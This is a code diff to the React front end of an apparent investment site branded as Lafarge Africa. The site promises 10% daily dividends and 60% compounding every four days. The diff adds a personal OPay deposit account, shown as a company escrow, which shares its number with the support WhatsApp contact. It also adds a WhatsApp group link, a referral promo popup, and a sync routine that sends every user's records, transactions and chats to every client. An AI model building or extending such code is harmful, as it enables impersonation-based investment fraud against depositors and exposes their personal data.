@@ -1,4 +1,4 @@
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useRef } from 'react';
 import { 
   Factory, 
   TrendingUp, 
@@ -21,7 +21,8 @@ import {
   Headphones,
   MessageSquare,
   Send,
-  User
+  User,
+  Share2
 } from 'lucide-react';
 
 import { ActiveInvestment, UserWallet, Transaction, SupportTicket, DepositAccount, ReferralRelationship } from './types';
@@ -40,13 +41,28 @@ import RegisterModal from './components/RegisterModal';
 import AdminPortal from './components/AdminPortal';
 import AuthScreen from './components/AuthScreen';
 import ProfileView from './components/ProfileView';
+import SplashScreen from './components/SplashScreen';
+import PromoReferralModal from './components/PromoReferralModal';
+import { motion } from 'motion/react';
 
 export default function App() {
+  const [isSplashActive, setIsSplashActive] = useState(true);
+  const [showPromoModal, setShowPromoModal] = useState(false);
+  const isJustRegisteredRef = useRef(false);
+  const syncLock = useRef(false);
+  const localVersion = useRef(0);
+  const isInitializedFromServer = useRef(false);
+  const isSyncingFromServer = useRef(false);
+
   const [activeTab, setActiveTab] = useState<'dashboard' | 'invest' | 'simulator' | 'faq' | 'cs' | 'admin' | 'profile'>('dashboard');
   const [adminApprovalSettings, setAdminApprovalSettings] = useState({
     requireDepositApproval: true,
     requireInvestmentApproval: true,
-    requireWithdrawalApproval: true
+    requireWithdrawalApproval: true,
+    customReferralLink: '',
+    isReferralLinkStatic: false,
+    csNumber: '08158432605',
+    officialWhatsAppGroup: 'https://chat.whatsapp.com/KHZgCi1h24154DqIIHz3VE'
   });
   const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
   
@@ -273,13 +289,14 @@ export default function App() {
 
   // Interactive Customer Service chat and ticket states
   const [depositAccounts, setDepositAccounts] = useState<DepositAccount[]>(() => {
-    const saved = localStorage.getItem('lafarge_deposit_accounts');
-    if (saved) {
-      try {
-        return JSON.parse(saved);
-      } catch (e) {}
-    }
-    return [
+    const defaultAccounts = [
+      {
+        id: 'da-opay-default',
+        bankName: 'OPay',
+        accountName: 'Lafarge Africa Option Escrow Ledger',
+        accountNumber: '8158432605',
+        isActive: true
+      },
       {
         id: 'da-1',
         bankName: 'Access International Bank PLC',
@@ -302,6 +319,21 @@ export default function App() {
         isActive: true
       }
     ];
+
+    const saved = localStorage.getItem('lafarge_deposit_accounts');
+    if (saved) {
+      try {
+        const parsed = JSON.parse(saved);
+        if (Array.isArray(parsed)) {
+          const hasNew = parsed.some(acc => acc.accountNumber === '8158432605');
+          if (!hasNew) {
+            return [defaultAccounts[0], ...parsed];
+          }
+          return parsed;
+        }
+      } catch (e) {}
+    }
+    return defaultAccounts;
   });
 
   const [csTickets, setCsTickets] = useState<SupportTicket[]>(() => {
@@ -471,6 +503,112 @@ export default function App() {
   useEffect(() => {
     localStorage.setItem('lafarge_referrals', JSON.stringify(referrals));
   }, [referrals]);
+
+  // Dynamic automatic synchronization with full-stack server
+  useEffect(() => {
+    let isMounted = true;
+    const poll = async () => {
+      try {
+        const res = await fetch('/api/sync');
+        if (res.ok && isMounted) {
+          const data = await res.json();
+          if (data && (data.version > localVersion.current || !isInitializedFromServer.current)) {
+            // New changes exist on server database. Lock synchronizer feedback and update state.
+            isSyncingFromServer.current = true;
+            localVersion.current = data.version;
+
+            if (data.registeredUsers) setRegisteredUsers(data.registeredUsers);
+            if (data.transactions) setTransactions(data.transactions);
+            if (data.activeInvestments) setActiveInvestments(data.activeInvestments);
+            if (data.depositAccounts) setDepositAccounts(data.depositAccounts);
+            if (data.csTickets) setCsTickets(data.csTickets);
+            if (data.userChatThreads) setUserChatThreads(data.userChatThreads);
+            if (data.referrals) setReferrals(data.referrals);
+            if (data.adminApprovalSettings) {
+              setAdminApprovalSettings({
+                requireDepositApproval: data.adminApprovalSettings.requireDepositApproval ?? true,
+                requireInvestmentApproval: data.adminApprovalSettings.requireInvestmentApproval ?? true,
+                requireWithdrawalApproval: data.adminApprovalSettings.requireWithdrawalApproval ?? true,
+                customReferralLink: data.adminApprovalSettings.customReferralLink ?? '',
+                isReferralLinkStatic: data.adminApprovalSettings.isReferralLinkStatic ?? false,
+                csNumber: data.adminApprovalSettings.csNumber ?? '08158432605',
+                officialWhatsAppGroup: data.adminApprovalSettings.officialWhatsAppGroup ?? 'https://chat.whatsapp.com/KHZgCi1h24154DqIIHz3VE'
+              });
+            }
+
+            isInitializedFromServer.current = true;
+
+            setTimeout(() => {
+              isSyncingFromServer.current = false;
+            }, 800);
+          }
+        }
+      } catch (e) {
+        console.error("Online poll error:", e);
+      }
+    };
+
+    poll();
+    const interval = setInterval(poll, 4000);
+    return () => {
+      isMounted = false;
+      clearInterval(interval);
+    };
+  }, []);
+
+  useEffect(() => {
+    // If the state has not been initialized from the server, do NOT push
+    if (!isInitializedFromServer.current) {
+      return;
+    }
+
+    // If the state changes were downloaded from polling/syncing, do NOT trigger feedback loop push
+    if (isSyncingFromServer.current) {
+      return;
+    }
+
+    const pushChanges = async () => {
+      try {
+        const payload = {
+          registeredUsers,
+          transactions,
+          activeInvestments,
+          depositAccounts,
+          csTickets,
+          userChatThreads,
+          referrals,
+          adminApprovalSettings,
+          clientVersion: localVersion.current
+        };
+
+        const res = await fetch('/api/sync', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+        if (res.ok) {
+          const data = await res.json();
+          if (data && data.version) {
+            localVersion.current = data.version;
+          }
+        }
+      } catch (error) {
+        console.error("Sync push error:", error);
+      }
+    };
+
+    pushChanges();
+  }, [
+    registeredUsers,
+    transactions,
+    activeInvestments,
+    depositAccounts,
+    csTickets,
+    userChatThreads,
+    referrals,
+    adminApprovalSettings
+  ]);
 
   useEffect(() => {
     if (!wallet || !wallet.email || wallet.email.toLowerCase() === 'admin1234@gmail.com') return;
@@ -1074,34 +1212,7 @@ export default function App() {
     setTimeout(() => setCopiedRef(false), 2000);
   };
 
-  const handleSimulateReferralDeposit = () => {
-    const nigerianNames = [
-      'Chidi Egwu', 'Ngozi Adebayo', 'Yusuf Ibrahim', 'Babajide Balogun',
-      'Olumide Alabi', 'Amarachi Okafor', 'Fatima Bello', 'Emeka Nwosu'
-    ];
-    const randomName = nigerianNames[Math.floor(Math.random() * nigerianNames.length)];
-    
-    setWallet(prev => ({
-      ...prev,
-      walletBalance: prev.walletBalance + 500,
-      earnedBalance: prev.earnedBalance + 500,
-      referralsCount: prev.referralsCount + 1,
-      referralEarnings: prev.referralEarnings + 500
-    }));
 
-    setTransactions(prev => [
-      {
-        id: `tx-ref-${Math.random().toString(36).substring(2, 9)}`,
-        type: 'payout',
-        amount: 500,
-        status: 'completed',
-        date: simulatedTime,
-        reference: generateRef(),
-        description: `Referral Reward: ${randomName} package deposit completed`
-      },
-      ...prev
-    ]);
-  };
 
   const handleRegisterSuccess = (newUser: {
     fullName: string;
@@ -1154,6 +1265,7 @@ export default function App() {
       setReferredByCode(newUser.referralUsed);
       checkAndRecordReferral(newWallet, registeredUsers);
     }
+    setShowPromoModal(true);
   };
 
   const handleClaimBonus = () => {
@@ -1364,8 +1476,32 @@ export default function App() {
     });
   };
 
+  const handleDeleteUser = (userEmail: string) => {
+    if (userEmail.toLowerCase() === 'admin1234@gmail.com') {
+      alert("Cannot delete primary Corporate Admin.");
+      return;
+    }
+
+    setRegisteredUsers((prevUsers) => {
+      const nextUsers = prevUsers.filter((u) => u.email.toLowerCase() !== userEmail.toLowerCase());
+      
+      if (wallet && wallet.email.toLowerCase() === userEmail.toLowerCase()) {
+        const fallback = nextUsers.find(u => u.email.toLowerCase() === 'jeremiahobazee11@gmail.com') || nextUsers[0];
+        if (fallback) {
+          setWallet(fallback);
+        }
+      }
+      return nextUsers;
+    });
+
+    setTransactions((prevTxs) => prevTxs.filter((tx) => tx.userEmail?.toLowerCase() !== userEmail.toLowerCase()));
+    setActiveInvestments((prevInvestments) => prevInvestments.filter((inv) => (inv.userEmail || '').toLowerCase() !== userEmail.toLowerCase()));
+    setReferrals((prevRefs) => prevRefs.filter((ref) => ref.referredEmail.toLowerCase() !== userEmail.toLowerCase() && ref.referrerEmail.toLowerCase() !== userEmail.toLowerCase()));
+  };
+
   const handleRegisterUser = (newUser: UserWallet) => {
     setRegisteredUsers((prev) => [...prev, newUser]);
+    isJustRegisteredRef.current = true;
     if (newUser.referredBy) {
       setReferredByCode(newUser.referredBy);
       checkAndRecordReferral(newUser, registeredUsers);
@@ -1388,6 +1524,10 @@ export default function App() {
       setActiveTab('admin');
     } else {
       setActiveTab('dashboard');
+      if (isJustRegisteredRef.current) {
+        setShowPromoModal(true);
+        isJustRegisteredRef.current = false;
+      }
     }
   };
 
@@ -1397,6 +1537,10 @@ export default function App() {
     setIsAdmin(false);
     setActiveTab('dashboard');
   };
+
+  if (isSplashActive) {
+    return <SplashScreen onComplete={() => setIsSplashActive(false)} />;
+  }
 
   if (!isLoggedIn) {
     return (
@@ -1559,7 +1703,12 @@ export default function App() {
         {/* Dynamic content render depending on ActiveTab */}
         
         {activeTab === 'dashboard' && (
-          <div className="space-y-8 animate-fade-in">
+          <motion.div 
+            initial={{ opacity: 0, y: 15 }}
+            animate={{ opacity: 1, y: 0 }}
+            transition={{ duration: 0.5, ease: [0.16, 1, 0.3, 1] }}
+            className="space-y-8"
+          >
             
             {/* Top Stats blocks */}
             <StatsGrid wallet={wallet} onOpenModal={handleOpenModal} />
@@ -1690,14 +1839,7 @@ export default function App() {
                     </div>
                   </div>
 
-                  {/* Simulation Trigger button */}
-                  <button
-                    onClick={handleSimulateReferralDeposit}
-                    className="w-full py-2.5 bg-green-50 hover:bg-green-150 text-green-700 hover:text-green-900 border border-green-200/50 rounded-xl text-xs font-bold transition-all flex items-center justify-center gap-1.5 cursor-pointer"
-                  >
-                    <Plus className="w-4 h-4" /> Simulate Referee Deposit (+₦500)
-                  </button>
-                </div>
+                  </div>
 
                 {/* Audit and Security trust widget */}
                 <div className="bg-white border border-gray-150 rounded-2xl p-5 md:p-6 shadow-sm space-y-4">
@@ -1722,11 +1864,16 @@ export default function App() {
               </div>
             </div>
 
-          </div>
+          </motion.div>
         )}
 
         {activeTab === 'invest' && (
-          <div className="space-y-8 animate-fade-in">
+          <motion.div 
+            initial={{ opacity: 0, y: 15 }}
+            animate={{ opacity: 1, y: 0 }}
+            transition={{ duration: 0.5, ease: [0.16, 1, 0.3, 1] }}
+            className="space-y-8"
+          >
             <div className="border-b border-green-150 pb-5">
               <h2 className="text-2xl md:text-3xl font-display font-black text-gray-950 tracking-tight">Cement Production Stock Options</h2>
               <p className="text-sm text-gray-500 mt-1 max-w-xl">Acquire shares in Nigeria's leading building material assets. Get an immediate 10% daily dividend payoff with options ranging from 15 days down to 6 days.</p>
@@ -1744,22 +1891,32 @@ export default function App() {
                 />
               ))}
             </div>
-          </div>
+          </motion.div>
         )}
 
         {activeTab === 'simulator' && (
-          <div className="space-y-8 animate-fade-in">
+          <motion.div 
+            initial={{ opacity: 0, y: 15 }}
+            animate={{ opacity: 1, y: 0 }}
+            transition={{ duration: 0.5, ease: [0.16, 1, 0.3, 1] }}
+            className="space-y-8"
+          >
             <div className="border-b border-green-150 pb-5">
               <h2 className="text-2xl md:text-3xl font-display font-black text-gray-950 tracking-tight">Compound Option Projections</h2>
               <p className="text-sm text-gray-500 mt-1 max-w-xl">Simulate Lafarge corporate options compounding velocity. Drag your capital stake slider below and witness high-volume rollover growth at exactly 60.0% every 4 days.</p>
             </div>
 
             <Calculator />
-          </div>
+          </motion.div>
         )}
 
         {activeTab === 'faq' && (
-          <div className="space-y-8 max-w-3xl mx-auto animate-fade-in">
+          <motion.div 
+            initial={{ opacity: 0, y: 15 }}
+            animate={{ opacity: 1, y: 0 }}
+            transition={{ duration: 0.5, ease: [0.16, 1, 0.3, 1] }}
+            className="space-y-8 max-w-3xl mx-auto"
+          >
             <div className="text-center space-y-2">
               <h2 className="text-2xl md:text-3xl font-display font-black text-gray-950 tracking-tight">Help & Secure Disclosures</h2>
               <p className="text-sm text-gray-400">Everything you need to know about Lafarge Africa Plc share allocations and daily payouts.</p>
@@ -1795,11 +1952,16 @@ export default function App() {
                 </div>
               ))}
             </div>
-          </div>
+          </motion.div>
         )}
 
         {activeTab === 'cs' && (
-          <div className="space-y-8 animate-fade-in">
+          <motion.div 
+            initial={{ opacity: 0, y: 15 }}
+            animate={{ opacity: 1, y: 0 }}
+            transition={{ duration: 0.5, ease: [0.16, 1, 0.3, 1] }}
+            className="space-y-8"
+          >
             {/* CS Banner Header */}
             <div className="border-b border-green-150 pb-5 space-y-2">
               <span className="text-[10px] font-bold text-[#028A34] bg-green-50 border border-green-100 px-3 py-1 rounded-full uppercase tracking-widest inline-block">
@@ -1925,23 +2087,55 @@ export default function App() {
                   <h4 className="font-bold text-gray-900 text-xs uppercase tracking-wider">Fast Support Hotline channels</h4>
                   
                   <div className="space-y-2.5">
-                    <a 
-                      href="https://wa.me/23480000000" 
-                      target="_blank" 
-                      rel="noopener noreferrer"
-                      className="flex items-center justify-between p-3 border border-green-100 bg-green-50/20 hover:bg-green-50/50 rounded-xl transition-all cursor-pointer group"
-                    >
-                      <div className="flex items-center gap-3">
-                        <div className="w-9 h-9 bg-green-500 rounded-lg text-white flex items-center justify-center">
-                          <MessageSquare className="w-4 h-4" />
+                    {(() => {
+                      const rawNum = adminApprovalSettings.csNumber || '08158432605';
+                      let cleaned = rawNum.replace(/\D/g, '');
+                      if (cleaned.startsWith('0')) {
+                        cleaned = '234' + cleaned.substring(1);
+                      } else if (!cleaned.startsWith('234') && cleaned.length === 10) {
+                        cleaned = '234' + cleaned;
+                      }
+                      const waLink = `https://wa.me/${cleaned}`;
+                      return (
+                        <a 
+                          href={waLink} 
+                          target="_blank" 
+                          rel="noopener noreferrer"
+                          className="flex items-center justify-between p-3 border border-green-100 bg-green-50/20 hover:bg-green-50/50 rounded-xl transition-all cursor-pointer group"
+                        >
+                          <div className="flex items-center gap-3">
+                            <div className="w-9 h-9 bg-green-500 rounded-lg text-white flex items-center justify-center font-bold">
+                              <MessageSquare className="w-4 h-4" />
+                            </div>
+                            <div>
+                              <p className="text-xs font-bold text-gray-900">Direct WhatsApp Account Desk</p>
+                              <p className="text-[10px] text-gray-400 font-semibold">Immediate 1-on-1 chatting support ({rawNum})</p>
+                            </div>
+                          </div>
+                          <ArrowUpRight className="w-4 h-4 text-gray-400 group-hover:text-[#028A34] transition-colors" />
+                        </a>
+                      );
+                    })()}
+
+                    {adminApprovalSettings.officialWhatsAppGroup && (
+                      <a 
+                        href={adminApprovalSettings.officialWhatsAppGroup} 
+                        target="_blank" 
+                        rel="noopener noreferrer"
+                        className="flex items-center justify-between p-3 border border-green-105 bg-green-55/5 hover:bg-green-55/15 rounded-xl transition-all cursor-pointer group"
+                      >
+                        <div className="flex items-center gap-3">
+                          <div className="w-9 h-9 bg-emerald-600 rounded-lg text-white flex items-center justify-center font-bold">
+                            <Share2 className="w-4 h-4" />
+                          </div>
+                          <div>
+                            <p className="text-xs font-bold text-gray-900">Official WhatsApp Group</p>
+                            <p className="text-[10px] text-gray-400 font-semibold">Join thousands of active shareholders live</p>
+                          </div>
                         </div>
-                        <div>
-                          <p className="text-xs font-bold text-gray-900">Direct WhatsApp Account Desk</p>
-                          <p className="text-[10px] text-gray-400 font-semibold">Immediate 1-on-1 chatting support</p>
-                        </div>
-                      </div>
-                      <ArrowUpRight className="w-4 h-4 text-gray-400 group-hover:text-[#028A34] transition-colors" />
-                    </a>
+                        <ArrowUpRight className="w-4 h-4 text-gray-400 group-hover:text-emerald-600 transition-colors" />
+                      </a>
+                    )}
 
                     <a 
                       href="https://t.me/lafarge_investment_hub" 
@@ -2056,47 +2250,69 @@ export default function App() {
 
               </div>
             </div>
-          </div>
+          </motion.div>
         )}
 
         {activeTab === 'profile' && (
-          <ProfileView
-            wallet={wallet}
-            onUpdateProfile={handleUpdateUserWalletByAdmin}
-            simulatedTime={simulatedTime}
-          />
+          <motion.div
+            initial={{ opacity: 0, y: 15 }}
+            animate={{ opacity: 1, y: 0 }}
+            transition={{ duration: 0.5, ease: [0.16, 1, 0.3, 1] }}
+          >
+            <ProfileView
+              wallet={wallet}
+              onUpdateProfile={handleUpdateUserWalletByAdmin}
+              simulatedTime={simulatedTime}
+              adminApprovalSettings={adminApprovalSettings}
+            />
+          </motion.div>
         )}
 
          {activeTab === 'admin' && (
-          <AdminPortal
-            transactions={transactions}
-            activeInvestments={activeInvestments}
-            wallet={wallet}
-            simulatedTime={simulatedTime}
-            adminApprovalSettings={adminApprovalSettings}
-            onSaveSettings={(settings) => setAdminApprovalSettings(settings)}
-            onApproveDeposit={handleApproveDeposit}
-            onDeclineDeposit={handleDeclineDeposit}
-            onApproveWithdrawal={handleApproveWithdrawal}
-            onDeclineWithdrawal={handleDeclineWithdrawal}
-            onApproveInvestment={handleApproveInvestment}
-            onDeclineInvestment={handleDeclineInvestment}
-            onUpdateUserWallet={handleUpdateUserWalletByAdmin}
-            registeredUsers={registeredUsers}
-            onSelectUser={handleSelectUser}
-            depositAccounts={depositAccounts}
-            onAddDepositAccount={handleAddDepositAccount}
-            onRemoveDepositAccount={handleRemoveDepositAccount}
-            onToggleDepositAccount={handleToggleDepositAccount}
-            csTickets={csTickets}
-            onReplyToTicket={handleReplyToTicket}
-            onUpdateTicketStatus={handleUpdateTicketStatus}
-            userChatThreads={userChatThreads}
-            onSendAdminChat={handleSendAdminChatBySupervisor}
-            referralsList={referrals}
-            onApproveReferral={handleApproveReferral}
-            onDeclineReferral={handleDeclineReferral}
-          />
+          <motion.div
+            initial={{ opacity: 0, y: 15 }}
+            animate={{ opacity: 1, y: 0 }}
+            transition={{ duration: 0.5, ease: [0.16, 1, 0.3, 1] }}
+          >
+            <AdminPortal
+              transactions={transactions}
+              activeInvestments={activeInvestments}
+              wallet={wallet}
+              simulatedTime={simulatedTime}
+              adminApprovalSettings={adminApprovalSettings}
+              onSaveSettings={(settings) => setAdminApprovalSettings({
+                requireDepositApproval: settings.requireDepositApproval,
+                requireInvestmentApproval: settings.requireInvestmentApproval,
+                requireWithdrawalApproval: settings.requireWithdrawalApproval,
+                customReferralLink: settings.customReferralLink || '',
+                isReferralLinkStatic: !!settings.isReferralLinkStatic,
+                csNumber: settings.csNumber || '08158432605',
+                officialWhatsAppGroup: settings.officialWhatsAppGroup || 'https://chat.whatsapp.com/KHZgCi1h24154DqIIHz3VE'
+              })}
+              onApproveDeposit={handleApproveDeposit}
+              onDeclineDeposit={handleDeclineDeposit}
+              onApproveWithdrawal={handleApproveWithdrawal}
+              onDeclineWithdrawal={handleDeclineWithdrawal}
+              onApproveInvestment={handleApproveInvestment}
+              onDeclineInvestment={handleDeclineInvestment}
+              onUpdateUserWallet={handleUpdateUserWalletByAdmin}
+              registeredUsers={registeredUsers}
+              onSelectUser={handleSelectUser}
+              onDeleteUser={handleDeleteUser}
+              depositAccounts={depositAccounts}
+              onAddDepositAccount={handleAddDepositAccount}
+              onRemoveDepositAccount={handleRemoveDepositAccount}
+              onToggleDepositAccount={handleToggleDepositAccount}
+              csTickets={csTickets}
+              onReplyToTicket={handleReplyToTicket}
+              onUpdateTicketStatus={handleUpdateTicketStatus}
+              userChatThreads={userChatThreads}
+              onSendAdminChat={handleSendAdminChatBySupervisor}
+              referralsList={referrals}
+              onApproveReferral={handleApproveReferral}
+              onDeclineReferral={handleDeclineReferral}
+            />
+          </motion.div>
         )}
 
       </main>
@@ -2120,6 +2336,13 @@ export default function App() {
         onClose={() => setIsRegisterOpen(false)}
         simulatedTime={simulatedTime}
         onRegisterSuccess={handleRegisterSuccess}
+      />
+
+      <PromoReferralModal
+        isOpen={showPromoModal}
+        onClose={() => setShowPromoModal(false)}
+        wallet={wallet}
+        adminApprovalSettings={adminApprovalSettings}
       />
 
       {/* Footer */}
